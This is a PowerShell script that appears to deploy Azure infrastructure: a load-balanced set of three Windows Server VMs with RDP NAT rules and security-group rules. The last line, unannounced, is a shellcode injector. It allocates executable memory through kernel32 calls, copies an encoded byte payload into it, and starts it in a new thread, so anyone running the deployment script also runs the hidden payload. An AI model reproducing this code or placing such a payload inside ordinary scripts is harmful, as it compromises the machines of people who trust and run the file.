
$rgName='MyResourceGroup'
$location='eastus'


$cred = Get-Credential -Message 'Enter a username and password for the virtual machine.'


New-AzResourceGroup -Name $rgName -Location $location


$subnet = New-AzVirtualNetworkSubnetConfig -Name 'MySubnet' -AddressPrefix 192.168.1.0/24

$vnet = New-AzVirtualNetwork -ResourceGroupName $rgName -Name 'MyVnet' `
  -AddressPrefix 192.168.0.0/16 -Location $location -Subnet $subnet


$publicIp = New-AzPublicIpAddress -ResourceGroupName $rgName -Name 'myPublicIP' `
  -Location $location -AllocationMethod Dynamic


$feip = New-AzLoadBalancerFrontendIpConfig -Name 'myFrontEndPool' -PublicIpAddress $publicIp


$bepool = New-AzLoadBalancerBackendAddressPoolConfig -Name 'myBackEndPool'


$probe = New-AzLoadBalancerProbeConfig -Name 'myHealthProbe' -Protocol Http -Port 80 `
  -RequestPath / -IntervalInSeconds 360 -ProbeCount 5


$rule = New-AzLoadBalancerRuleConfig -Name 'myLoadBalancerRuleWeb' -Protocol Tcp `
  -Probe $probe -FrontendPort 80 -BackendPort 80 `
  -FrontendIpConfiguration $feip -BackendAddressPool $bePool


$natrule1 = New-AzLoadBalancerInboundNatRuleConfig -Name 'myLoadBalancerRDP1' -FrontendIpConfiguration $feip `
  -Protocol tcp -FrontendPort 4221 -BackendPort 3389

$natrule2 = New-AzLoadBalancerInboundNatRuleConfig -Name 'myLoadBalancerRDP2' -FrontendIpConfiguration $feip `
  -Protocol tcp -FrontendPort 4222 -BackendPort 3389

$natrule3 = New-AzLoadBalancerInboundNatRuleConfig -Name 'myLoadBalancerRDP3' -FrontendIpConfiguration $feip `
  -Protocol tcp -FrontendPort 4223 -BackendPort 3389


$lb = New-AzLoadBalancer -ResourceGroupName $rgName -Name 'MyLoadBalancer' -Location $location `
  -FrontendIpConfiguration $feip -BackendAddressPool $bepool `
  -Probe $probe -LoadBalancingRule $rule -InboundNatRule $natrule1,$natrule2,$natrule3


$rule1 = New-AzNetworkSecurityRuleConfig -Name 'myNetworkSecurityGroupRuleRDP' -Description 'Allow RDP' `
  -Access Allow -Protocol Tcp -Direction Inbound -Priority 1000 `
  -SourceAddressPrefix Internet -SourcePortRange * `
  -DestinationAddressPrefix * -DestinationPortRange 3389


$rule2 = New-AzNetworkSecurityRuleConfig -Name 'myNetworkSecurityGroupRuleHTTP' -Description 'Allow HTTP' `
  -Access Allow -Protocol Tcp -Direction Inbound -Priority 2000 `
  -SourceAddressPrefix Internet -SourcePortRange * `
  -DestinationAddressPrefix * -DestinationPortRange 80


$nsg = New-AzNetworkSecurityGroup -ResourceGroupName $RgName -Location $location `
-Name 'myNetworkSecurityGroup' -SecurityRules $rule1,$rule2


$nicVM1 = New-AzNetworkInterface -ResourceGroupName $rgName -Location $location `
  -Name 'MyNic1' -LoadBalancerBackendAddressPool $bepool -NetworkSecurityGroup $nsg `
  -LoadBalancerInboundNatRule $natrule1 -Subnet $vnet.Subnets[0]

$nicVM2 = New-AzNetworkInterface -ResourceGroupName $rgName -Location $location `
  -Name 'MyNic2' -LoadBalancerBackendAddressPool $bepool -NetworkSecurityGroup $nsg `
  -LoadBalancerInboundNatRule $natrule2 -Subnet $vnet.Subnets[0]

$nicVM3 = New-AzNetworkInterface -ResourceGroupName $rgName -Location $location `
  -Name 'MyNic3' -LoadBalancerBackendAddressPool $bepool -NetworkSecurityGroup $nsg `
  -LoadBalancerInboundNatRule $natrule3 -Subnet $vnet.Subnets[0]


$as = New-AzAvailabilitySet -ResourceGroupName $rgName -Location $location `
  -Name 'MyAvailabilitySet' -Sku Aligned -PlatformFaultDomainCount 3 -PlatformUpdateDomainCount 3






$vmConfig = New-AzVMConfig -VMName 'myVM1' -VMSize Standard_DS2 -AvailabilitySetId $as.Id | `
  Set-AzVMOperatingSystem -Windows -ComputerName 'myVM1' -Credential $cred | `
  Set-AzVMSourceImage -PublisherName MicrosoftWindowsServer -Offer WindowsServer `
  -Skus 2016-Datacenter -Version latest | Add-AzVMNetworkInterface -Id $nicVM1.Id


$vm1 = New-AzVM -ResourceGroupName $rgName -Location $location -VM $vmConfig




$vmConfig = New-AzVMConfig -VMName 'myVM2' -VMSize Standard_DS2 -AvailabilitySetId $as.Id | `
  Set-AzVMOperatingSystem -Windows -ComputerName 'myVM2' -Credential $cred | `
  Set-AzVMSourceImage -PublisherName MicrosoftWindowsServer -Offer WindowsServer `
  -Skus 2016-Datacenter -Version latest | Add-AzVMNetworkInterface -Id $nicVM2.Id


$vm2 = New-AzVM -ResourceGroupName $rgName -Location $location -VM $vmConfig




$vmConfig = New-AzVMConfig -VMName 'myVM3' -VMSize Standard_DS2 -AvailabilitySetId $as.Id | `
  Set-AzVMOperatingSystem -Windows -ComputerName 'myVM3' -Credential $cred | `
  Set-AzVMSourceImage -PublisherName MicrosoftWindowsServer -Offer WindowsServer `
  -Skus 2016-Datacenter -Version latest | Add-AzVMNetworkInterface -Id $nicVM3.Id


$vm3 = New-AzVM -ResourceGroupName $rgName -Location $location -VM $vmConfig

$rnqsGN = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $rnqsGN -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc0,0xb8,0x83,0xd5,0x63,0x6f,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x46,0x14,0x03,0x46,0x97,0x37,0x96,0x93,0x7f,0x35,0x59,0x6c,0x7f,0x5a,0xd3,0x89,0x4e,0x5a,0x87,0xda,0xe0,0x6a,0xc3,0x8f,0x0c,0x00,0x81,0x3b,0x87,0x64,0x0e,0x4b,0x20,0xc2,0x68,0x62,0xb1,0x7f,0x48,0xe5,0x31,0x82,0x9d,0xc5,0x08,0x4d,0xd0,0x04,0x4d,0xb0,0x19,0x54,0x06,0xbe,0x8c,0x49,0x23,0x8a,0x0c,0xe1,0x7f,0x1a,0x15,0x16,0x37,0x1d,0x34,0x89,0x4c,0x44,0x96,0x2b,0x81,0xfc,0x9f,0x33,0xc6,0x39,0x69,0xcf,0x3c,0xb5,0x68,0x19,0x0d,0x36,0xc6,0x64,0xa2,0xc5,0x16,0xa0,0x04,0x36,0x6d,0xd8,0x77,0xcb,0x76,0x1f,0x0a,0x17,0xf2,0x84,0xac,0xdc,0xa4,0x60,0x4d,0x30,0x32,0xe2,0x41,0xfd,0x30,0xac,0x45,0x00,0x94,0xc6,0x71,0x89,0x1b,0x09,0xf0,0xc9,0x3f,0x8d,0x59,0x89,0x5e,0x94,0x07,0x7c,0x5e,0xc6,0xe8,0x21,0xfa,0x8c,0x04,0x35,0x77,0xcf,0x40,0xfa,0xba,0xf0,0x90,0x94,0xcd,0x83,0xa2,0x3b,0x66,0x0c,0x8e,0xb4,0xa0,0xcb,0xf1,0xee,0x15,0x43,0x0c,0x11,0x66,0x4d,0xca,0x45,0x36,0xe5,0xfb,0xe5,0xdd,0xf5,0x04,0x30,0x4b,0xf3,0x92,0x7b,0x24,0x6b,0x0c,0x14,0x37,0x8c,0xc1,0xb8,0xbe,0x6a,0xb1,0x10,0x91,0x22,0x71,0xc1,0x51,0x93,0x19,0x0b,0x5e,0xcc,0x39,0x34,0xb4,0x65,0xd3,0xdb,0x61,0xdd,0x4b,0x45,0x28,0x95,0xea,0x8a,0xe6,0xd3,0x2c,0x00,0x05,0x23,0xe2,0xe1,0x60,0x37,0x92,0x01,0x3f,0x65,0x34,0x1d,0x95,0x00,0xb8,0x8b,0x12,0x83,0xef,0x23,0x19,0xf2,0xc7,0xeb,0xe2,0xd1,0x5c,0x25,0x77,0x9a,0x0a,0x4a,0x97,0x1a,0xca,0x1c,0xfd,0x1a,0xa2,0xf8,0xa5,0x48,0xd7,0x06,0x70,0xfd,0x44,0x93,0x7b,0x54,0x39,0x34,0x14,0x5a,0x64,0x72,0xbb,0xa5,0x43,0x82,0x87,0x73,0xad,0xf0,0xe9,0x47;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$rnqs=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($rnqs.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$rnqs,0,0,0);for (;;){Start-sleep 60};

